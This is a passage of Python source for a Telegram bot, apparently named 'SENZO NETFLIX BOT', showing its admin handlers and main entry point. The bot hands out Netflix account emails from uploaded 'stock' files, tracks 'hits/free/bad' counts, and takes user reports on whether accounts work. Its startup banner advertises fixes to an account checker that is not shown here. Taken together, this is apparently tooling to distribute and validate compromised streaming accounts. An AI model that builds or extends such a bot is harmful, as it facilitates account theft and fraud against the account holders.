        admin_id = update.effective_user.id
        if not is_admin(admin_id):
            await self._send_message(update, "⛔ Not authorized!")
            return
        data = update.callback_query.data
        if data.startswith("admin_ban_"):
            uid = int(data.split("_")[-1])
            self.user_repo.ban(uid, admin_id, "Banned by admin")
            await self._send_message(update, f"🚫 Banned user <code>{uid}</code>.")
            return
        if data.startswith("admin_warn_"):
            uid = int(data.split("_")[-1])
            warnings = self.user_repo.add_warning(uid, admin_id, "Warned by admin")
            await self._send_message(update, f"⚠️ User <code>{uid}</code> warnings: {warnings}/3")
            return
        if data.startswith("reset_user_"):
            uid = int(data.split("_")[-1])
            self.db.execute_meta(
                "UPDATE users SET accounts_used = 0, working_reports = 0, notworking_reports = 0, warnings = 0, last_account_time = NULL WHERE user_id = ?",
                (uid,),
            )
            self.db.commit_meta()
            await self._send_message(update, f"🔄 Reset stats for <code>{uid}</code>.")

    async def admin_broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update.effective_user.id):
            await self._send_message(update, "⛔ Not authorized!")
            return
        context.user_data["waiting_for_broadcast"] = True
        await self._send_message(
            update,
            "📢 Send the broadcast message (text or photo with caption).",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_panel")]]),
        )

    async def admin_reports(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update.effective_user.id):
            await self._send_message(update, "⛔ Not authorized!")
            return
        pending = self.report_repo.get_pending()
        keyboard = []
        lines = ""
        for rep in pending[:15]:
            acc = self.account_repo.get_by_id(rep["account_id"])
            email = acc.email if acc else "?"
            lines += f"• #{rep['id']} {rep['report_type']} — {html_escape(email)}\n"
            keyboard.append([InlineKeyboardButton(f"📋 #{rep['id']}", callback_data=f"view_rep_{rep['id']}")])
        keyboard.append([InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")])
        await self._send_message(
            update,
            f"📋 <b>PENDING REPORTS</b> ({len(pending)})\n\n{lines or 'No pending reports.'}",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )

    async def view_report_detail(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update.effective_user.id):
            await self._send_message(update, "⛔ Not authorized!")
            return
        report_id = int(update.callback_query.data.split("_")[-1])
        rep = self.report_repo.get_by_id(report_id)
        if not rep:
            await self._send_message(update, "Report not found.")
            return
        acc = self.account_repo.get_by_id(rep["account_id"])
        text = (
            f"📋 <b>REPORT #{report_id}</b>\n"
            f"Type: {html_escape(rep['report_type'])}\n"
            f"User: <code>{rep['user_id']}</code>\n"
            f"Account: <code>{html_escape(acc.email if acc else '?')}</code>\n"
            f"Status: {html_escape(rep['status'])}\n"
        )
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Confirm Working", callback_data=f"confirm_working_{report_id}")],
            [
                InlineKeyboardButton("🚫 Ban User", callback_data=f"ban_user_{rep['user_id']}_{report_id}"),
                InlineKeyboardButton("❌ Dismiss", callback_data=f"dismiss_report_{report_id}"),
            ],
            [InlineKeyboardButton("🔙 Reports", callback_data="admin_reports")],
        ])
        if rep.get("screenshot_file_id"):
            await update.callback_query.message.reply_photo(
                rep["screenshot_file_id"],
                caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=keyboard,
            )
        else:
            await self._send_message(update, text, reply_markup=keyboard)

    async def admin_channels(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update.effective_user.id):
            await self._send_message(update, "⛔ Not authorized!")
            return
        channels = self.channel_repo.get_active()
        lines = ""
        keyboard = []
        for ch_id, ch_name, ch_link in channels:
            lines += f"• {html_escape(ch_name)} — <code>{html_escape(ch_id)}</code>\n"
            keyboard.append([InlineKeyboardButton(f"🗑️ {ch_name}", callback_data=f"del_channel_{ch_id}")])
        keyboard.append([InlineKeyboardButton("➕ Add Channel", callback_data="add_channel_prompt")])
        keyboard.append([InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")])
        await self._send_message(
            update,
            f"📢 <b>FORCE-SUB CHANNELS</b>\n\n{lines or 'No channels configured.'}",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )

    async def add_channel_prompt(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update.effective_user.id):
            await self._send_message(update, "⛔ Not authorized!")
            return
        context.user_data["waiting_for_channel_add"] = True
        await self._send_message(
            update,
            "Send channel in format:\n<code>@channelusername|Display Name|https://t.me/invite</code>",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_channels")]]),
        )

    async def del_channel_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update.effective_user.id):
            await self._send_message(update, "⛔ Not authorized!")
            return
        ch_id = update.callback_query.data.replace("del_channel_", "", 1)
        self.db.execute_meta("UPDATE channels SET is_active = 0 WHERE channel_id = ?", (ch_id,))
        self.db.commit_meta()
        await self.admin_channels(update, context)

    async def admin_stock_logs(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update.effective_user.id):
            await self._send_message(update, "⛔ Not authorized!")
            return
        logs = self.stats_repo.get_stock_logs(15)
        lines = ""
        for log in logs:
            lines += f"• {html_escape(log['file_name'])} — {log['valid']}/{log['total']} @ {html_escape(log['time'])}\n"
        await self._send_message(
            update,
            f"📊 <b>STOCK LOGS</b>\n\n{lines or 'No uploads yet.'}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]]),
        )

    async def admin_dashboard(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not is_admin(update.effective_user.id):
            await self._send_message(update, "⛔ Not authorized!")
            return
        stats = self.account_repo.get_total()
        today = self.stats_repo.get_today()
        users = self.user_repo.get_all()
        pending = self.report_repo.get_pending()
        text = (
            f"📈 <b>DASHBOARD</b>\n"
            f"Users: <b>{len(users)}</b>\n"
            f"Stock: <b>{stats.get('total', 0)}</b>\n"
            f"Pending reports: <b>{len(pending)}</b>\n"
            f"Today hits/free/bad: {today['hits']}/{today['free']}/{today['bad']}\n"
            f"Meta DB: <b>{html_escape(self.db.meta_backend())}</b>\n"
            f"Accounts DB: <code>{html_escape(DATABASE_PATH)}</code>\n"
        )
        await self._send_message(
            update,
            text,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_panel")]]),
        )

    async def confirm_working_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        admin_id = update.effective_user.id
        if not is_admin(admin_id) and REPORT_CHANNEL_ID:
            try:
                member = await context.bot.get_chat_member(REPORT_CHANNEL_ID, admin_id)
                if member.status not in (ChatMember.ADMINISTRATOR, ChatMember.OWNER):
                    await update.callback_query.answer("Not authorized", show_alert=True)
                    return
            except Exception:
                if not is_admin(admin_id):
                    await update.callback_query.answer("Not authorized", show_alert=True)
                    return
        report_id = int(update.callback_query.data.split("_")[-1])
        rep = self.report_repo.get_by_id(report_id)
        if not rep:
            await update.callback_query.answer("Report not found", show_alert=True)
            return
        self.report_repo.update_status(report_id, "confirmed", admin_id)
        self.db.execute_meta(
            "UPDATE users SET total_working = total_working + 1 WHERE user_id = ?",
            (rep["user_id"],),
        )
        self.db.commit_meta()
        if rep.get("account_id"):
            self.db.execute_sqlite(
                "UPDATE accounts SET working_confirmed = 1 WHERE id = ?",
                (rep["account_id"],),
            )
            self.db.commit_sqlite()
        self.stats_repo.log_daily(hits=1)
        await update.callback_query.answer("Working confirmed")
        try:
            await update.callback_query.edit_message_reply_markup(reply_markup=None)
        except Exception:
            pass

    async def ban_user_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        admin_id = update.effective_user.id
        if not is_admin(admin_id):
            await update.callback_query.answer("Not authorized", show_alert=True)
            return
        parts = update.callback_query.data.split("_")
        user_id = int(parts[2])
        report_id = int(parts[3]) if len(parts) > 3 else 0
        self.user_repo.ban(user_id, admin_id, "Banned from report review")
        if report_id:
            self.report_repo.update_status(report_id, "banned", admin_id)
        await update.callback_query.answer("User banned")

    async def warn_user_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        admin_id = update.effective_user.id
        if not is_admin(admin_id):
            await update.callback_query.answer("Not authorized", show_alert=True)
            return
        parts = update.callback_query.data.split("_")
        user_id = int(parts[2])
        report_id = int(parts[3]) if len(parts) > 3 else 0
        warnings = self.user_repo.add_warning(user_id, admin_id, "Warned from report")
        if report_id:
            self.report_repo.update_status(report_id, "warned", admin_id)
        await update.callback_query.answer(f"Warning issued ({warnings}/3)")

    async def dismiss_report_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        admin_id = update.effective_user.id
        if not is_admin(admin_id):
            await update.callback_query.answer("Not authorized", show_alert=True)
            return
        report_id = int(update.callback_query.data.split("_")[-1])
        self.report_repo.update_status(report_id, "dismissed", admin_id)
        await update.callback_query.answer("Dismissed")

    async def handle_text_messages(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        text = (update.message.text or "").strip()
        if not text:
            return

        if context.user_data.get("waiting_for_message"):
            context.user_data.pop("waiting_for_message", None)
            self.db.execute_meta(
                "INSERT INTO messages (user_id, message) VALUES (?, ?)",
                (user_id, text),
            )
            self.db.commit_meta()
            await update.message.reply_text("✅ Message sent to admins. We will reply soon.")
            for aid in ADMIN_IDS:
                try:
                    await context.bot.send_message(
                        aid,
                        f"📩 Message from <code>{user_id}</code>:\n{html_escape(text)}",
                        parse_mode=ParseMode.HTML,
                    )
                except Exception:
                    pass
            return

        if is_admin(user_id) and context.user_data.get("waiting_for_user_search"):
            context.user_data.pop("waiting_for_user_search", None)
            user = self.user_repo.find_by_query(text)
            if not user:
                await update.message.reply_text("User not found.")
                return
            target_id = user.user_id
            user = self.user_repo.get(target_id)
            detail = (
                f"👤 <b>USER</b> <code>{target_id}</code>\n"
                f"Name: {html_escape(user.first_name)}\n"
                f"Username: @{html_escape(user.username)}\n"
                f"Banned: {'Yes' if user.is_banned else 'No'}\n"
                f"Warnings: {user.warnings}/3\n"
                f"Accounts used: {user.accounts_used}\n"
            )
            keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("🚫 Ban", callback_data=f"admin_ban_{target_id}"),
                    InlineKeyboardButton("⚠️ Warn", callback_data=f"admin_warn_{target_id}"),
                ],
                [InlineKeyboardButton("🔄 Reset Stats", callback_data=f"reset_user_{target_id}")],
                [InlineKeyboardButton("🔙 Users", callback_data="admin_users")],
            ])
            await update.message.reply_text(detail, parse_mode=ParseMode.HTML, reply_markup=keyboard)
            return

        if is_admin(user_id) and context.user_data.get("waiting_for_channel_add"):
            context.user_data.pop("waiting_for_channel_add", None)
            parts = text.split("|")
            if len(parts) < 3:
                await update.message.reply_text("Invalid format. Use: channel_id|Name|invite_link")
                return
            ch_id, ch_name, ch_link = parts[0].strip(), parts[1].strip(), parts[2].strip()
            self.channel_repo.add(ch_id, ch_name, ch_link)
            await update.message.reply_text(f"✅ Channel {ch_name} added.")
            return

        if is_admin(user_id) and context.user_data.get("waiting_for_broadcast"):
            context.user_data["broadcast_caption"] = text
            users = self.user_repo.get_all()
            sent, failed = 0, 0
            status = await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
            for u in users:
                if u.is_banned:
                    continue
                try:
                    await context.bot.send_message(u.user_id, text, parse_mode=ParseMode.HTML)
                    sent += 1
                except Exception:
                    failed += 1
            context.user_data.pop("waiting_for_broadcast", None)
            context.user_data.pop("broadcast_caption", None)
            await status.edit_text(f"✅ Broadcast done. Sent: {sent}, Failed: {failed}")

# ============================================================
# MAIN APPLICATION
# ============================================================

def main():
    print("=" * 70)
    print("🎬 SENZO NETFLIX BOT - ULTIMATE EDITION v9.0")
    print("🔥 FULLY WORKING - CLI LEVEL ACCURACY")
    print("✅ COMPLETE FIX: & split, pg= remove, 3 URLs, 3 Unicode passes")
    print("=" * 70)
    if not ADMIN_IDS:
        print("⚠️ ADMIN_IDS not set — admin panel will be unavailable.")
    print(f"🗄️ Users DB: {db.meta_backend()} | Accounts: {DATABASE_PATH}")
    print(f"👤 Admins: {ADMIN_IDS}")
    print(f"📢 Report Channel: {REPORT_CHANNEL_ID if REPORT_CHANNEL_ID else 'NOT SET'}")
    print(f"⏳ Cooldown: {WORKING_COOLDOWN_MINUTES} min")
    print(f"🔧 Threads: {MAX_CHECK_THREADS}")
    print("=" * 70)
    print("📋 FIXES APPLIED:")
    print("  ✅ decode_netflix_value - & split (removes ALL query params)")
    print("  ✅ decode_netflix_value - pg= removal")
    print("  ✅ decode_netflix_value - 3 Unicode passes (CLI Level)")
    print("  ✅ NetflixService.check_account - 3 URLs (CLI Level)")
    print("  ✅ NetflixService.check_account - Complete GraphQL parsing")
    print("  ✅ parse_localized_date - 100+ month aliases (CLI Level)")
    print("  ✅ extract_info - Complete 20+ fields extraction")
    print("  ✅ derive_plan_info - 100+ plan aliases (CLI Level)")
    print("=" * 70)
    
    try:
        health_thread = threading.Thread(target=start_health_server, daemon=True)
        health_thread.start()
        logger.info(f"🌐 Health check server started on port {PORT}")
    except Exception as e:
        logger.error(f"Health server error: {e}")

    if not BOT_TOKEN:
        logger.warning("⚠️ BOT_TOKEN environment variable is not set!")
        logger.info(f"🌐 Health server remains running on port {PORT} for Railway deployment health checks.")
        while True:
            time.sleep(30)
    
    handlers = BotHandlers()
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler(["start", "help"], handlers.start))
    application.add_handler(CommandHandler(["get", "gen", "account"], handlers.get_account_callback))
    application.add_handler(CommandHandler(["status", "mystatus"], handlers.my_status))
    application.add_handler(CommandHandler(["stats"], handlers.stats_command))
    application.add_handler(CommandHandler(["contact"], handlers.contact_admin))
    application.add_handler(CommandHandler(["admin"], handlers.admin_panel))
    
    application.add_handler(CallbackQueryHandler(handlers.get_account_callback, pattern="^get_account$"))
    application.add_handler(CallbackQueryHandler(handlers.working_callback, pattern="^(working|report_working_)"))
    application.add_handler(CallbackQueryHandler(handlers.notworking_callback, pattern="^(notworking|report_notworking_)"))
    application.add_handler(CallbackQueryHandler(handlers.contact_admin, pattern="^contact$"))
    application.add_handler(CallbackQueryHandler(handlers.my_status, pattern="^my_status$"))
    application.add_handler(CallbackQueryHandler(handlers.back_to_menu, pattern="^back_menu$"))
    
    application.add_handler(CallbackQueryHandler(handlers.admin_panel, pattern="^admin_panel$"))
    application.add_handler(CallbackQueryHandler(handlers.admin_stock_mgr, pattern="^(admin_stock_mgr|sm_filter_)"))
    application.add_handler(CallbackQueryHandler(handlers.delete_account_callback, pattern="^(del_acc_|clear_stock_)"))
    application.add_handler(CallbackQueryHandler(handlers.admin_user_search_prompt, pattern="^admin_user_search$"))
    application.add_handler(CallbackQueryHandler(handlers.admin_banned, pattern="^admin_banned$"))
    application.add_handler(CallbackQueryHandler(handlers.admin_upload, pattern="^admin_upload$"))
    application.add_handler(CallbackQueryHandler(handlers.admin_reports, pattern="^admin_reports$"))
    application.add_handler(CallbackQueryHandler(handlers.view_report_detail, pattern="^view_rep_"))
    application.add_handler(CallbackQueryHandler(handlers.admin_users, pattern="^admin_users$"))
    application.add_handler(CallbackQueryHandler(handlers.manage_user_detail, pattern="^manage_user_"))
    application.add_handler(CallbackQueryHandler(handlers.admin_user_actions_callback, pattern="^(admin_ban_|admin_warn_|reset_user_)"))
    application.add_handler(CallbackQueryHandler(handlers.unban_user_callback, pattern="^unban_user_"))
    application.add_handler(CallbackQueryHandler(handlers.admin_broadcast, pattern="^admin_broadcast$"))
    application.add_handler(CallbackQueryHandler(handlers.admin_channels, pattern="^admin_channels$"))
    application.add_handler(CallbackQueryHandler(handlers.add_channel_prompt, pattern="^add_channel_prompt$"))
    application.add_handler(CallbackQueryHandler(handlers.del_channel_callback, pattern="^del_channel_"))
    application.add_handler(CallbackQueryHandler(handlers.admin_stock_logs, pattern="^admin_stock_logs$"))
    application.add_handler(CallbackQueryHandler(handlers.admin_dashboard, pattern="^admin_dashboard$"))
    
    application.add_handler(CallbackQueryHandler(handlers.confirm_working_callback, pattern="^confirm_working_"))
    application.add_handler(CallbackQueryHandler(handlers.ban_user_callback, pattern="^ban_user_"))
    application.add_handler(CallbackQueryHandler(handlers.warn_user_callback, pattern="^warn_user_"))
    application.add_handler(CallbackQueryHandler(handlers.dismiss_report_callback, pattern="^dismiss_report_"))
    
    application.add_handler(MessageHandler(filters.PHOTO, handlers.handle_screenshot))
    application.add_handler(MessageHandler(filters.Document.ALL, handlers.handle_file_upload))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handlers.handle_text_messages))
    
    try:
        print("🚀 Starting bot...")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
